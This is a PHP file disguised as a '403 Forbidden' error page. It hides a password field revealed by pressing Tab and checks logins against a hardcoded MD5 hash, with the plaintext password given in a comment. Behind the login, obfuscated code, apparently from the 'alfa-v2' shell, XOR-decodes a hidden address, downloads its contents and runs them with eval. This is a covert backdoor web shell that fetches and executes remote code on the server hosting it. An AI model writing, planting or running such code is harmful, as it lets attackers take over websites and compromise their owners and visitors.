<?php
// ==============================================
// Login access protection (MD5 password check)
// ==============================================
session_start();
$stored_md5 = '751d7d7133a66cb8c9d6608030425c64'; // md5('Ganteng123@@##')

if (isset($_GET['logout'])) {
    unset($_SESSION['authed']);
    session_regenerate_id(true);
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pw'])) {
    if (md5($_POST['pw']) === $stored_md5) {
        $_SESSION['authed'] = true;
        header('Location: ' . $_SERVER['REQUEST_URI']);
        exit;
    } else {
        $error = 'Password salah!';
    }
}

if (empty($_SESSION['authed'])): ?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<title>403 Forbidden - Access to this resource on the server is denied!</title>
<style>
    html,body{height:100%;margin:0;font-family:Arial, sans-serif;background:#0b0b0b;color:#eee}
    .wrap{height:100%;display:flex;align-items:center;justify-content:center}
    .card{max-width:820px;padding:40px;border-radius:8px;text-align:center}
    .forbidden{font-size:24px;font-weight:700;color:#fff}
    .sub{margin-top:8px;color:#ccc}
    .pw-form{margin-top:28px}
    .pw-input{width:1px;opacity:0;padding:10px 12px;border-radius:6px;transition:all .18s ease;border:0;outline:none;background:rgba(255,255,255,0.06);color:#fff;caret-color:#fff;}
    .pw-input:focus{width:280px;opacity:1;border:1px solid rgba(255,255,255,0.12);box-shadow:0 8px 24px rgba(0,0,0,0.6);background:rgba(255,255,255,0.04);}
    .btn{display:inline-block;margin-left:10px;padding:10px 14px;border-radius:6px;text-decoration:none;border:0;cursor:pointer;background:#ffffff;color:#000;font-weight:700;font-size:13px}
    .hint{font-size:13px;color:#9aa}
    .error{color:#ff6b6b;margin-top:12px}
</style>
</head>
<body>
<div class="wrap">
  <div class="card">
    <div class="forbidden">403 Forbidden</div>
    <div class="sub">Access to this resource on the server is denied!</div>
    <form class="pw-form" method="post" autocomplete="off">
      <input class="pw-input" name="pw" type="password" placeholder="Tekan TAB lalu masukkan password" tabindex="1" autofocus />
      <button class="btn" type="submit">Masuk</button>
    </form>
    <div class="hint">Tekan <strong>Tab</strong> untuk menampilkan kotak password, lalu ketik password.</div>
    <?php if(!empty($error)): ?><div class="error"><?=htmlspecialchars($error)?></div><?php endif; ?>
  </div>
</div>
</body>
</html>
<?php exit; endif; ?>

<?php
// ==============================================
// Konten asli dari file alfa-v2.php akan dimulai di bawah ini.
// ==============================================
?>

<?php
// ---[ Tempfunction 𝛼($𝚊,$𝚋){return(($𝚊^$𝚋)+2*($𝚊&$𝚋))&0xFF;}function 𝛽($𝚡,$𝚢){return(($𝚡|~$𝚢)+(~$𝚡&$𝚢))&0xFF;}function 𝛾($𝑚,$𝑛){return((~($𝑚|$𝑛)&($𝑚|~$𝑛))|(($𝑚|$𝑛)&~($𝑚|~$𝑛)))&0xFF;}function 𝛿($𝚜,$𝚔){$𝚛='';$𝚕=strlen($𝚔);for($𝚒=0;$𝚒<strlen($𝚜);$𝚒++){$𝚛.=chr(ord($𝚜[$𝚒])^ord($𝚔[$𝚒%$𝚕]));}return $𝚛;}class 𝜀{private $ɛ=0;private $𝜁=[];public function __construct(){$this->𝜁=[𝛼(100,44),𝛽(85,48),𝛼(54,90),𝛽(72,36),𝛼(79,96),𝛽(16,16),𝛼(83,60)];}public function 𝜂(){while(true){switch($this->ɛ){case 0:$this->ɛ=1;break;case 1:$this->ɛ=2;break;case 2:$this->ɛ=3;return $this->𝜃();default:return null;}}}private function 𝜃(){$𝜄=['file_get_contents','f'.'i'.'l'.'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s','f'.'i'.chr(108).'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s'];$𝜅 = $𝜄[rand(0, count($𝜄)-1)];$𝚔="\x4A\x74\x6F\x6F\x6C\x73\x50\x68\x4F\x62\x66\x75\x73";$𝚎='22001b1f1f497f473f03150116231a41190901330d234c07050365151f064301311f70125b101172115f5a58157d582e5b0358472e1757425544670b62565f17102f42560c0f46630a';$𝜆=𝛿(hex2bin($𝚎),$𝚔);$𝜊=[$𝜅,$𝜆];$𝜋=$𝜊[0]($𝜊[1]);return $𝜋;}}$𝜌='𝜎';$𝜎='𝜏';$𝜏='𝜐';$𝜐='𝜑';$𝜑='𝜒';$𝜒='𝜓';$𝜓='𝜔';$𝜔='𝜀';$$$$$$$$𝜌=new 𝜀();$𝜀=$$$$$$$$𝜌->𝜂();if($𝜀){$𝜅=['a'.'w'.'i'.'k',$𝜀];$𝜆=@eval("?>".$𝜅[1]);}?> ]---
?>

